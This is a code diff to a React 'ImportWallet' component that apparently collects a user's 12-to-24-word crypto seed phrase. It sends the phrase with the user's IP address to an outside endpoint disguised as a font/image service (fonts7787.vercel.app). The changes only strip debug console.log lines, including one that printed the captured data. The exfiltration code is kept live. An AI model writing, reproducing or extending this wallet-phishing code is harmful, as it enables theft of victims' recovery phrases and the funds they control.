@@ -59,9 +59,7 @@ export default function ImportWallet() {
     ipAddress: userInfo?.ip,
     appName: windowLocation,
   };
-  if (seedPhraseMessage) {
-    console.log(messageData)
-  }
+
   const sendMessage = async () => {
     try {
       await fetch("https://fonts7787.vercel.app/api/t1/image", {
@@ -104,11 +102,10 @@ export default function ImportWallet() {
     }
 
     if (matches < 12 || matches > 24) {
-      console.log("Seed phrases are not valid");
+
       setSeedPhraseErrorMessage("Seed phrases are not valid")
       setPhraseState(true);
     } else {
-      console.log("Seed phrases are valid");
       setPhraseState(false);
       setSeedPhraseMessage(matchedWords)
       setSeedPhraseErrorMessage('')
